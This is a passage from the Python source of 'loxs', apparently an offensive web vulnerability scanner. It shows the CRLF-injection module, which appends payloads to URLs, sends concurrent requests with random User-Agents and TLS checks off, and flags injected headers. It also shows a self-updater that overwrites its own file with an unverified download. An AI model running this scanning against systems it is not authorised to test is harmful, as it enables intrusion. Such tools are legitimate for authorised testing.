                status_forcelist=status_forcelist,
            )
            adapter = HTTPAdapter(max_retries=retry)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            return session

        def check_crlf_vulnerability(url, payload):
            payloads = generate_payloads(url)
            target_url = f"{url}{payload}"
            start_time = time.time()
            
            headers = {
                'User-Agent': get_random_user_agent(),
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close'
            }

            try:
                session = get_retry_session()
                response = session.get(target_url, headers=headers, allow_redirects=False, verify=False, timeout=10)
                response_time = time.time() - start_time

                is_vulnerable = False
                vulnerability_details = []

                for header, value in response.headers.items():
                    if any(re.search(pattern, f"{header}: {value}", re.IGNORECASE) for pattern in REGEX_PATTERNS):
                        is_vulnerable = True
                        vulnerability_details.append(f"{Fore.WHITE}Header Injection: {Fore.LIGHTBLACK_EX}{header}: {value}")

                if any(re.search(pattern, response.text, re.IGNORECASE) for pattern in REGEX_PATTERNS):
                    is_vulnerable = True
                    vulnerability_details.append(f"{Fore.WHITE}Body Injection: {Fore.LIGHTBLACK_EX}Detected CRLF in response body")

                if response.status_code in [200, 201, 202, 204, 205, 206, 207, 301, 302, 307, 308]:
                    if is_vulnerable:
                        result = Fore.GREEN + f"[✓] {Fore.CYAN}Vulnerable: {Fore.GREEN} {target_url} {Fore.CYAN} - Response Time: {response_time:.2f} seconds"
                        if vulnerability_details:
                            result += "\n    {}↪ ".format(Fore.YELLOW) + "\n    {}↪ ".format(Fore.YELLOW).join(vulnerability_details)
                    else:
                        result = Fore.RED + f"[✗] {Fore.CYAN}Not Vulnerable: {Fore.RED} {target_url} {Fore.CYAN} - Response Time: {response_time:.2f} seconds"
                else:
                    result = Fore.RED + f"[✗] {Fore.CYAN}Not Vulnerable: {Fore.RED} {target_url} {Fore.CYAN} - Response Time: {response_time:.2f} seconds"

                if scan_state:
                    scan_state['total_scanned'] += 1
                    if is_vulnerable:
                        scan_state['vulnerability_found'] = True
                        scan_state['vulnerable_urls'].append(target_url)
                        scan_state['total_found'] += 1

                return result, is_vulnerable

            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"[!] Error accessing {target_url}: {str(e)}")
                return None, False

        def test_crlf(url, max_threads=5):
            found_vulnerabilities = 0
            vulnerable_urls = []
            payloads = generate_payloads(url)

            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                future_to_payload = {executor.submit(check_crlf_vulnerability, url, payload): payload for payload in payloads}
                for future in as_completed(future_to_payload):
                    payload = future_to_payload[future]
                    try:
                        result, is_vulnerable = future.result()
                        if result:
                            print(Fore.YELLOW + f"[→] Scanning with payload: {payload}")
                            print(result)
                            if is_vulnerable:
                                found_vulnerabilities += 1
                                vulnerable_urls.append(url + payload)
                    except Exception as e:
                        print(Fore.RED + f"[!] Exception occurred for payload {payload}: {str(e)}")
            return found_vulnerabilities, vulnerable_urls

        def print_scan_summary(total_found, total_scanned, start_time):
            summary = [
                "→ Scanning finished.",
                f"• Total found: {Fore.GREEN}{total_found}{Fore.YELLOW}",
                f"• Total scanned: {total_scanned}",
                f"• Time taken: {int(time.time() - start_time)} seconds"
            ]
            max_length = max(len(line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')) for line in summary)
            border = "┌" + "─" * (max_length + 2) + "┐"
            bottom_border = "└" + "─" * (max_length + 2) + "┘"
            
            print(Fore.YELLOW + f"\n{border}")
            for line in summary:
                padded_line = line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')
                padding = max_length - len(padded_line)
                print(Fore.YELLOW + f"│ {line}{' ' * padding} │{Fore.YELLOW}")
            print(Fore.YELLOW + bottom_border)

        def save_results(vulnerable_urls, total_found, total_scanned, start_time):
            generate_report = input(f"{Fore.CYAN}\n[?] Do you want to generate an HTML report? (y/n): ").strip().lower()
            if generate_report == 'y':
                html_content = generate_html_report("Carriage Return Line Feed Injection (CRLF)", total_found, total_scanned, int(time.time() - start_time), vulnerable_urls)
                filename = input(f"{Fore.CYAN}[?] Enter the filename for the HTML report: ").strip()
                report_file = save_html_report(html_content, filename)

        def get_file_path(prompt_text):
            return prompt(prompt_text, completer=PathCompleter())

        def prompt_for_urls():
            while True:
                try:
                    url_input = get_file_path("[?] Enter the path to the input file containing the URLs (or press Enter to input a single URL): ")
                    if url_input:
                        if not os.path.isfile(url_input):
                            raise FileNotFoundError(f"File not found: {url_input}")
                        with open(url_input) as file:
                            urls = [line.strip() for line in file if line.strip()]
                        return urls
                    else:
                        single_url = input(f"{Fore.CYAN}[?] Enter a single URL to scan: ").strip()
                        if single_url:
                            return [single_url]
                        else:
                            print(f"{Fore.RED}[!] You must provide either a file with URLs or a single URL.")
                            input(f"{Fore.YELLOW}\n[i] Press Enter to try again...")
                            clear_screen()
                            print(f"{Fore.GREEN}Welcome to the CRLF Injection Testing Tool!\n")
                except Exception as e:
                    print(f"{Fore.RED}[!] Error reading input file: {url_input}. Exception: {str(e)}")
                    input(f"{Fore.YELLOW}[i] Press Enter to try again...")
                    clear_screen()
                    print(f"{Fore.GREEN}Welcome to the CRLF Injection Testing Tool!\n")
        
        clear_screen()
        panel = Panel(
        r"""
   __________  __    ______
  / ____/ __ \/ /   / ____/  ______________ _____  ____  ___  _____
 / /   / /_/ / /   / /_     / ___/ ___/ __ `/ __ \/ __ \/ _ \/ ___/
/ /___/ _, _/ /___/ __/    (__  ) /__/ /_/ / / / / / / /  __/ /
\____/_/ |_/_____/_/      /____/\___/\__,_/_/ /_/_/ /_/\___/_/

        """,
        style="bold green",
        border_style="blue",
        expand=False
        )
        rich_print(panel, "\n")

        print(Fore.GREEN + "Welcome to the CRLF Injection Testing Tool!\n")

        urls = prompt_for_urls()
        
        max_threads_input = input("[?] Enter the number of concurrent threads (1-10, press Enter for 5): ").strip()
        max_threads = int(max_threads_input) if max_threads_input.isdigit() and 1 <= int(max_threads_input) <= 10 else 5

        print(Fore.YELLOW + "\n[i] Loading, Please Wait...")
        time.sleep(1)
        clear_screen()
        print(Fore.CYAN + "[i] Starting scan...\n")

        total_found = 0
        total_scanned = 0
        start_time = time.time()
        vulnerable_urls = []

        if scan_state is None:
            scan_state = {
                'vulnerability_found': False,
                'vulnerable_urls': [],
                'total_found': 0,
                'total_scanned': 0
            }

        for url in urls:
            box_content = f" → Scanning URL: {url} "
            box_width = max(len(box_content) + 2, 40)
            print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
            print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
            print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")

            found, urls_with_payloads = test_crlf(url, max_threads)
            total_found += found
            total_scanned += len(generate_payloads(url))
            vulnerable_urls.extend(urls_with_payloads)

        print_scan_summary(total_found, total_scanned, start_time)
        save_results(vulnerable_urls, total_found, total_scanned, start_time)

        print(Fore.RED + "\nExiting...")
        os._exit(0)
        
        
    
    def run_update():
        from packaging import version
        import requests
        from rich.console import Console
        from rich.panel import Panel
        from rich.progress import Progress
        
        console = Console()
        def display_update_intro():
            panel = Panel(
                r"""
 
░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░▒▓████████▓▒░▒▓████████▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░ ░▒▓█▓▒░   ░▒▓██████▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░
 ░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓████████▓▒░
        """,
                title="LOXS UPDATER",
                expand=False,
                border_style="blue",
                style="bold green",
            )
            console.print(panel)
            console.print("[cyan] Welcome to the loxs updater![/cyan]\n")

        def get_latest_release(repo_owner, repo_name):
            url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/releases/latest"
            try:
                response = requests.get(url)
                response.raise_for_status()
                release_data = response.json()
                return release_data['tag_name'], release_data
            except requests.exceptions.RequestException as e:
                console.print(f"[red][!] Error fetching release information: {e}[/red]")
                return None, None

        def get_current_version():
            try:
                with open(__file__, 'r') as file:
                    for line in file:
                        if line.startswith('VERSION ='):
                            return line.split('=')[1].strip().strip("'\"")
            except IOError as e:
                console.print(f"[red][!] Error reading current version: {e}[/red]")
            return None

        def download_update(download_url, file_path):
            try:
                with Progress() as progress:
                    task = progress.add_task("[cyan]Downloading update...", total=100)
                    response = requests.get(download_url, stream=True)
                    response.raise_for_status()
                    total_size = int(response.headers.get('content-length', 0))
                    block_size = 1024
                    with open(file_path, 'wb') as file:
                        for data in response.iter_content(block_size):
                            size = file.write(data)
                            progress.update(task, advance=(size/total_size)*100)
                console.print("[green][✓] Update downloaded successfully.[/green]")
                return True
            except requests.exceptions.RequestException as e:
                console.print(f"[red][!] Error downloading update: {e}[/red]")
                return False

        def normalize_version(v):
            # Remove 'v' prefix if present
            # v = v.lstrip('v')

            # Three components (major.minor.patch)
            parts = v.split('.')
            while len(parts) < 3:
                parts.append('0')
            return '.'.join(parts)

        display_update_intro()

        repo_owner = "coffinxp"
        repo_name = "loxs"
        current_version = get_current_version()

        if current_version is None:
            console.print("[yellow][!] Unable to find current version.[/yellow]")
            input("\nPress Enter to return to the main menu...")
            return

        console.print(f"[cyan][i] Current version: {current_version}[/cyan]")
        console.print("[cyan][i] Checking for updates...[/cyan]")

        latest_version, release_data = get_latest_release(repo_owner, repo_name)

        if latest_version is None:
            console.print("[yellow][!] Unable to check for updates.[/yellow]")
            input("\nPress Enter to return to the main menu...")
            return

        current_v = version.parse(normalize_version(current_version))
        latest_v = version.parse(normalize_version(latest_version))

        if latest_v > current_v:
            console.print(f"[green][✓] New version available: {latest_version}[/green]")
            update_choice = console.input("[cyan][?] Do you want to update? (y/n): [/cyan]").lower().strip()
            
            if update_choice == 'y':
                try:
                    download_url = release_data['assets'][0]['browser_download_url']
                    
                    if download_update(download_url, __file__):
                        console.print("[green][✓] Update completed. Please restart loxs..!![/green]")
                    else:
                        console.print("[red][!] Update failed.[/red]")
                except (KeyError, IndexError) as e:
                    console.print(f"[red][!] Error fetching release assets: {e}[/red]")
            else:
                console.print("[yellow][i] Update cancelled.[/yellow]")
        else:
            console.print("[green][✓] You are already using the latest version.[/green]")
            console.print(f"[cyan][i] Current version: {current_version}[/cyan]")
            console.print(f"[cyan][i] Latest version: {latest_version}[/cyan]")

        input("\nPress Enter to return to the main menu...")


    def handle_selection(selection):
        if selection == '1':
            clear_screen()
            run_lfi_scanner()

        elif selection == '2':
            clear_screen()
            run_or_scanner()

        elif selection == '3':
            clear_screen()
            run_sql_scanner()

        elif selection == '4':
            clear_screen()
            run_xss_scanner()

        elif selection == '5':
            clear_screen()
            run_crlf_scanner()

        elif selection == '6':
            clear_screen()
            run_update()
            clear_screen()

        elif selection == '7':
            clear_screen()
            print_exit_menu()

        else:
            print_exit_menu()

    def main():
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        clear_screen()
        sleep(0.1)
        clear_screen()
        
        while True:
            try:
                display_menu()
                choice = input(f"\n{Fore.CYAN}[?] Select an option (0-7): {Style.RESET_ALL}").strip()
                handle_selection(choice)
            except KeyboardInterrupt:
                print_exit_menu()
                os._exit(0)

    if __name__ == "__main__":
        try:
            main()
        except KeyboardInterrupt:
            print_exit_menu()
            os._exit(0)
            
except KeyboardInterrupt:
    print_exit_menu()
